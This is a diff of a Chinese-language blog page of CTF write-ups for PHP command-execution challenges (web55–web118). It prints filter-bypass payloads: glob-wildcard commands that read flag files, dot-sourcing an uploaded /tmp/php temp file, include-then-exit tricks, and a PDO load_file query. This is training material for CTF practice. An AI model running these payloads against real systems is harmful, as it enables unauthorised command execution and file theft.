 <pre class="line-numbers language-none"><code class="language-none">&#x2F;bin&#x2F;?at$&#123;IFS&#125;f???????<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-
-
 <h2 id="web55"><a href="#web55" class="headerlink" title="web55"></a>web55</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php">if(isset($_GET[&#39;c&#39;]))&#123;
     $c&#x3D;$_GET[&#39;c&#39;];
     if(!preg_match(&quot;&#x2F;\;|[a-z]|\&#96;|\%|\x09|\x26|\&gt;|\&lt;&#x2F;i&quot;, $c))&#123;
@@ -1016,19 +923,15 @@ nl$&#123;IFS&#125;fla\g.php<span aria-hidden="true" class="line-numbers-rows"><s
 &#125;else&#123;
     highlight_file(__FILE__);
 &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>不能有分号 字母 反引号 百分号 \x09 \x26 大于号 小于号 </p>
 <p>题解链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_46091464/article/details/108513145">https://blog.csdn.net/qq_46091464/article/details/108513145</a></p>
 <p>具体操作就是linux命令当中 点. 操作符的妙用，这个操作符可以将一个文件的内容当作linux命令来执行，</p>
 <p>比如当前目录有一个test.txt文件，里面的内容是ls；则</p>
-<p>. .&#x2F;test.txt 就会打印出当前目录的文件，注意点操作符后面要跟绝对路径</p>
-<p>回到这题就是我们手工上传一个文件，然后php的临时文件存放在 &#x2F;tmp&#x2F;phpXXXXXX, php字符后面是随机的6个大小写字母；上传的同时我们用点操作符引用这个文件就可以了。但是有一些操作上的细节需要注意，比如如何描述我们上传的这个文件的绝对路径？需要使用linux的glob通配符</p>
-<p>未知字符可以用问号?代替，同时[^_]表示这个字符不能是_，并且[ @-[ ]表示字符范围必须从 @ 到 [;  用这两项技能就可以表示我们的临时文件了。</p>
+<p>. ./test.txt 就会打印出当前目录的文件，注意点操作符后面要跟绝对路径</p>
+<p>回到这题就是我们手工上传一个文件，然后php的临时文件存放在 /tmp/phpXXXXXX, php字符后面是随机的6个大小写字母；上传的同时我们用点操作符引用这个文件就可以了。但是有一些操作上的细节需要注意，比如如何描述我们上传的这个文件的绝对路径？需要使用linux的glob通配符</p>
+<p>未知字符可以用问号?代替，同时[^<em>]表示这个字符不能是\</em>，并且[ @-[ ]表示字符范围必须从 @ 到 [;  用这两项技能就可以表示我们的临时文件了。</p>
 <p>payload</p>
 <pre class="line-numbers language-none"><code class="language-none">?c&#x3D;. &#x2F;???&#x2F;????????[@-[]]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-
-
 <h2 id="web56"><a href="#web56" class="headerlink" title="web56"></a>web56</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php">if(isset($_GET[&#39;c&#39;]))&#123;
     $c&#x3D;$_GET[&#39;c&#39;];
     if(!preg_match(&quot;&#x2F;\;|[a-z]|[0-9]|\\$|\(|\&#123;|\&#39;|\&quot;|\&#96;|\%|\x09|\x26|\&gt;|\&lt;&#x2F;i&quot;, $c))&#123;
@@ -1037,7 +940,6 @@ nl$&#123;IFS&#125;fla\g.php<span aria-hidden="true" class="line-numbers-rows"><s
 &#125;else&#123;
     highlight_file(__FILE__);
 &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>不能有分号 字母 数字 美元符号 左括号 左花括号 单双引号 反引号 百分号 \x09 \x26 大于小于号 </p>
 <p>可以用上题的payload，因为没有过滤点跟问号以及方括号什么的。 </p>
 <h2 id="web68-70"><a href="#web68-70" class="headerlink" title="web68-70"></a>web68-70</h2><p>PHP中能够显示文件内容的函数有</p>
@@ -1045,7 +947,6 @@ nl$&#123;IFS&#125;fla\g.php<span aria-hidden="true" class="line-numbers-rows"><s
 require_once(&#39;flag.php&#39;)
 show_source(&quot;flag.php&quot;)
 highlight_file(&quot;flag.php&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
 <h2 id="web71"><a href="#web71" class="headerlink" title="web71"></a>web71</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
 error_reporting(0);
 ini_set(&#39;display_errors&#39;, 0);
@@ -1062,7 +963,6 @@ if(isset($_POST[&#39;c&#39;]))&#123;
 
 ?&gt;
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>我们可以通过eval执行代码，所以只要执行exit函数让程序提前退出；后面的过滤代码就不会被执行。</p>
 <p>payload：<code>c=include(&quot;/flag.txt&quot;);exit(0);</code></p>
 <h2 id="web72-77"><a href="#web72-77" class="headerlink" title="web72-77"></a>web72-77</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
@@ -1083,8 +983,7 @@ if(isset($_POST[&#39;c&#39;]))&#123;
 ?&gt;
 
 你要上天吗？<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p> glob:&#x2F;&#x2F; — 查找匹配的文件路径模式 </p>
+<p> glob:// — 查找匹配的文件路径模式 </p>
 <p>glob详解<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.glob.php">https://www.php.net/manual/zh/wrappers.glob.php</a></p>
 <p>payload：</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php">c&#x3D;?&gt;&lt;?php
@@ -1098,7 +997,6 @@ c&#x3D;try &#123;$dbh &#x3D; new PDO(&#39;mysql:host&#x3D;localhost;dbname&#x3D;
 &#39;root&#39;);foreach($dbh-&gt;query(&#39;select load_file(&quot;&#x2F;flag36.txt&quot;)&#39;) as $row)
 &#123;echo($row[0]).&quot;|&quot;; &#125;$dbh &#x3D; null;&#125;catch (PDOException $e) &#123;echo $e-
 &gt;getMessage();exit(0);&#125;exit(0);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <h2 id="web118"><a href="#web118" class="headerlink" title="web118"></a>web118</h2><p>题解链接</p>
 <p><a target="_blank" rel="noopener" href="https://www.xiinnn.com/article/16e95fdf.html">https://www.xiinnn.com/article/16e95fdf.html</a></p>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_46081055/article/details/121721209">https://blog.csdn.net/weixin_46081055/article/details/121721209</a></p>
@@ -1472,7 +1370,7 @@ c&#x3D;try &#123;$dbh &#x3D; new PDO(&#39;mysql:host&#x3D;localhost;dbname&#x3D;
             contentSelector: '#articleContent',
             headingsOffset: -($(window).height() * 0.4 - 45),
             collapseDepth: Number('0'),
-            headingSelector: 'h2, h3, h4'
+            headingSelector: 'h2, h3, h4,h5'
         });
 
         // modify the toc link href to support Chinese.
@@ -1484,7 +1382,7 @@ c&#x3D;try &#123;$dbh &#x3D; new PDO(&#39;mysql:host&#x3D;localhost;dbname&#x3D;
 
         // modify the heading title id to support Chinese.
         i = 0;
-        $('#articleContent').children('h2, h3, h4').each(function () {
+        $('#articleContent').children('h2, h3, h4,h5').each(function () {
             $(this).attr('id', tocHeading + (++i));
         });
 
@@ -1613,7 +1511,7 @@ c&#x3D;try &#123;$dbh &#x3D; new PDO(&#39;mysql:host&#x3D;localhost;dbname&#x3D;
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">267.7k</span>
+                        class="white-color">259.5k</span>
             
             
             
